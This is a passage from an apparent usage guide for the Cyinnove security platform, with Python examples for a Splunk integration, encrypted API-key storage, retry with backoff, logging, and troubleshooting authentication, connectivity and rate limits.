                'index': 'cyinnove_vulnerabilities',
                'event': {
                    'id': vuln['id'],
                    'title': vuln['title'],
                    'severity': vuln['severity'],
                    'status': vuln['status'],
                    'affected_assets': vuln['affected_assets'],
                    'cve_id': vuln.get('cve_id'),
                    'description': vuln['description']
                }
            }
            
            vuln_index.submit(json.dumps(event_data))
        
        print(f"✅ Synced {len(vulns['data'])} vulnerabilities to Splunk")
    
    def create_splunk_alerts(self):
        """Create Splunk alerts for high-priority security events"""
        
        # Alert for critical vulnerabilities
        critical_vuln_search = '''
        index=cyinnove_vulnerabilities severity=critical status=open
        | stats count by affected_assets
        | where count > 0
        '''
        
        self.splunk.saved_searches.create(
            name="Cyinnove Critical Vulnerabilities",
            search=critical_vuln_search,
            **{
                'alert_type': 'always',
                'alert_severity': 'high',
                'alert_suppress': '0',
                'alert_track': '1',
                'cron_schedule': '*/15 * * * *',  # Every 15 minutes
                'is_scheduled': '1',
                'actions': 'email',
                'action.email.to': 'security-team@company.com',
                'action.email.subject': 'Critical Vulnerabilities Detected'
            }
        )
        
        print("✅ Created Splunk alerts for critical vulnerabilities")
    
    def query_splunk_for_threats(self):
        """Query Splunk for threats and analyze with Cyinnove"""
        
        # Search for suspicious network activity
        search_query = '''
        index=network_logs
        | where src_ip!=dest_ip
        | stats count by src_ip, dest_ip
        | where count > 1000
        | head 100
        '''
        
        job = self.splunk.jobs.create(search_query)
        
        # Wait for job to complete
        while not job.is_done():
            time.sleep(1)
        
        # Process results
        suspicious_ips = []
        for result in results.ResultsReader(job.results()):
            if isinstance(result, dict):
                suspicious_ips.append(result['src_ip'])
        
        # Analyze suspicious IPs with Cyinnove
        threat_analyzer = ThreatIntelligenceAnalyzer(self.cyinnove.api_key)
        
        for ip in suspicious_ips:
            analysis = threat_analyzer.analyze_ioc(ip, 'ip')
            
            if analysis.get('threat_score', 0) > 70:
                # Create incident in Cyinnove
                incident = {
                    "title": f"High-Risk IP Activity: {ip}",
                    "description": f"Splunk detected suspicious activity from IP {ip} with threat score {analysis['threat_score']}/100",
                    "severity": "high",
                    "category": "network_threat",
                    "affected_systems": ["network"]
                }
                
                self.cyinnove.create_incident(incident)
                print(f"🚨 Created incident for suspicious IP: {ip}")

# Usage
splunk_config = {
    'host': 'splunk.company.com',
    'port': 8089,
    'username': 'admin',
    'password': 'password'
}

integration = CyinnoveSplunkIntegration(
    cyinnove_api_key="cy_your_api_key_here",
    splunk_config=splunk_config
)

# Sync data
integration.sync_vulnerabilities_to_splunk()
integration.create_splunk_alerts()
integration.query_splunk_for_threats()
```

## Best Practices

### 1. API Key Management

```python
import os
from cryptography.fernet import Fernet

class SecureAPIKeyManager:
    """Secure management of API keys"""
    
    def __init__(self):
        self.key = self._get_or_create_key()
        self.cipher = Fernet(self.key)
    
    def _get_or_create_key(self):
        """Get encryption key from environment or create new one"""
        key_file = os.path.expanduser('~/.cyinnove/key')
        
        if os.path.exists(key_file):
            with open(key_file, 'rb') as f:
                return f.read()
        else:
            # Create new key
            key = Fernet.generate_key()
            os.makedirs(os.path.dirname(key_file), exist_ok=True)
            with open(key_file, 'wb') as f:
                f.write(key)
            os.chmod(key_file, 0o600)  # Read-only for owner
            return key
    
    def store_api_key(self, api_key):
        """Securely store API key"""
        encrypted_key = self.cipher.encrypt(api_key.encode())
        
        key_file = os.path.expanduser('~/.cyinnove/api_key')
        with open(key_file, 'wb') as f:
            f.write(encrypted_key)
        os.chmod(key_file, 0o600)
    
    def get_api_key(self):
        """Retrieve and decrypt API key"""
        key_file = os.path.expanduser('~/.cyinnove/api_key')
        
        if not os.path.exists(key_file):
            raise FileNotFoundError("API key not found. Please run 'cyinnove configure'")
        
        with open(key_file, 'rb') as f:
            encrypted_key = f.read()
        
        return self.cipher.decrypt(encrypted_key).decode()

# Usage
key_manager = SecureAPIKeyManager()
key_manager.store_api_key("cy_your_api_key_here")
api_key = key_manager.get_api_key()
```

### 2. Rate Limiting and Error Handling

```python
import time
import random
from functools import wraps

def retry_with_backoff(max_retries=3, base_delay=1, max_delay=60):
    """Decorator for retrying API calls with exponential backoff"""
    
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            for attempt in range(max_retries):
                try:
                    return func(*args, **kwargs)
                
                except requests.exceptions.HTTPError as e:
                    if e.response.status_code == 429:  # Rate limited
                        if attempt < max_retries - 1:
                            delay = min(base_delay * (2 ** attempt) + random.uniform(0, 1), max_delay)
                            print(f"Rate limited. Retrying in {delay:.2f} seconds...")
                            time.sleep(delay)
                            continue
                    raise
                
                except requests.exceptions.RequestException as e:
                    if attempt < max_retries - 1:
                        delay = base_delay * (2 ** attempt)
                        print(f"Request failed. Retrying in {delay} seconds...")
                        time.sleep(delay)
                        continue
                    raise
            
            return None
        
        return wrapper
    return decorator

class RobustCyinnoveClient(CyinnoveClient):
    """Enhanced Cyinnove client with robust error handling"""
    
    @retry_with_backoff(max_retries=3)
    def get_vulnerabilities_robust(self, **kwargs):
        """Get vulnerabilities with retry logic"""
        return super().get_vulnerabilities(**kwargs)
    
    @retry_with_backoff(max_retries=5)
    def create_vulnerability_robust(self, **kwargs):
        """Create vulnerability with retry logic"""
        return super().create_vulnerability(**kwargs)
```

### 3. Logging and Monitoring

```python
import logging
from datetime import datetime

class CyinnoveLogger:
    """Structured logging for Cyinnove operations"""
    
    def __init__(self, name="cyinnove"):
        self.logger = logging.getLogger(name)
        self.logger.setLevel(logging.INFO)
        
        # Create formatters
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        
        # Console handler
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(formatter)
        self.logger.addHandler(console_handler)
        
        # File handler
        file_handler = logging.FileHandler('cyinnove.log')
        file_handler.setFormatter(formatter)
        self.logger.addHandler(file_handler)
    
    def log_scan_start(self, target, scan_type):
        """Log scan initiation"""
        self.logger.info(f"Starting {scan_type} scan for target: {target}")
    
    def log_vulnerability_found(self, vuln_type, severity, target):
        """Log vulnerability discovery"""
        self.logger.warning(
            f"Vulnerability found - Type: {vuln_type}, "
            f"Severity: {severity}, Target: {target}"
        )
    
    def log_api_call(self, endpoint, status_code, response_time):
        """Log API calls for monitoring"""
        self.logger.info(
            f"API Call - Endpoint: {endpoint}, "
            f"Status: {status_code}, Response Time: {response_time}ms"
        )
    
    def log_error(self, error, context=""):
        """Log errors with context"""
        self.logger.error(f"Error {context}: {str(error)}")

# Usage
logger = CyinnoveLogger()
logger.log_scan_start("example.com", "vulnerability")
logger.log_vulnerability_found("SQL Injection", "high", "example.com/login")
```

## Troubleshooting

### Common Issues and Solutions

#### 1. Authentication Errors

```python
def diagnose_auth_issues(api_key):
    """Diagnose common authentication problems"""
    
    issues = []
    
    # Check API key format
    if not api_key.startswith('cy_'):
        issues.append("❌ API key should start with 'cy_'")
    
    if len(api_key) < 35:
        issues.append("❌ API key appears too short")
    
    # Test API key validity
    try:
        auth_manager = AuthenticationManager(api_key)
        is_valid = auth_manager.validate_api_key(api_key)
        
        if not is_valid:
            issues.append("❌ API key validation failed")
        else:
            issues.append("✅ API key is valid")
    
    except Exception as e:
        issues.append(f"❌ Authentication error: {str(e)}")
    
    return issues

# Usage
issues = diagnose_auth_issues("cy_your_api_key_here")
for issue in issues:
    print(issue)
```

#### 2. Network and Connectivity Issues

```python
def diagnose_connectivity():
    """Diagnose network connectivity issues"""
    
    import requests
    import socket
    
    tests = []
    
    # Test DNS resolution
    try:
        socket.gethostbyname('api.cyinnove.org')
        tests.append("✅ DNS resolution working")
    except socket.gaierror:
        tests.append("❌ DNS resolution failed")
    
    # Test HTTPS connectivity
    try:
        response = requests.get('https://api.cyinnove.org/v1/health', timeout=10)
        if response.status_code == 200:
            tests.append("✅ HTTPS connectivity working")
        else:
            tests.append(f"⚠️  HTTPS connectivity issue: {response.status_code}")
    except requests.exceptions.RequestException as e:
        tests.append(f"❌ HTTPS connectivity failed: {str(e)}")
    
    # Test proxy settings
    proxy_env = os.environ.get('HTTPS_PROXY') or os.environ.get('https_proxy')
    if proxy_env:
        tests.append(f"ℹ️  Proxy detected: {proxy_env}")
    
    return tests

# Usage
connectivity_tests = diagnose_connectivity()
for test in connectivity_tests:
    print(test)
```

#### 3. Rate Limiting Issues

```python
def handle_rate_limiting():
    """Handle rate limiting gracefully"""
    
    client = CyinnoveClient("cy_your_api_key_here")
    
    try:
        vulnerabilities = client.get_vulnerabilities(limit=100)
        return vulnerabilities
    
    except requests.exceptions.HTTPError as e:
        if e.response.status_code == 429:
            # Get rate limit headers
            headers = e.response.headers
            limit = headers.get('X-RateLimit-Limit', 'Unknown')
            remaining = headers.get('X-RateLimit-Remaining', 'Unknown')
            reset_time = headers.get('X-RateLimit-Reset', 'Unknown')
            
            print(f"Rate limit exceeded!")
            print(f"Limit: {limit} requests per hour")
            print(f"Remaining: {remaining}")
            print(f"Reset time: {reset_time}")
            
            # Calculate wait time
            if reset_time != 'Unknown':
                wait_time = int(reset_time) - int(time.time())
                print(f"Wait {wait_time} seconds before next request")
            
        raise

# Usage
try:
    data = handle_rate_limiting()
except Exception as e:
    print(f"Error: {e}")
```

---

This comprehensive usage guide provides practical examples and best practices for using Cyinnove's security platform effectively. Whether you're just getting started or building advanced security automation workflows, these examples will help you maximize the value of our security tools.

For additional support, please contact us at zomasec@proton.me or visit our documentation at [https://docs.cyinnove.org](https://docs.cyinnove.org).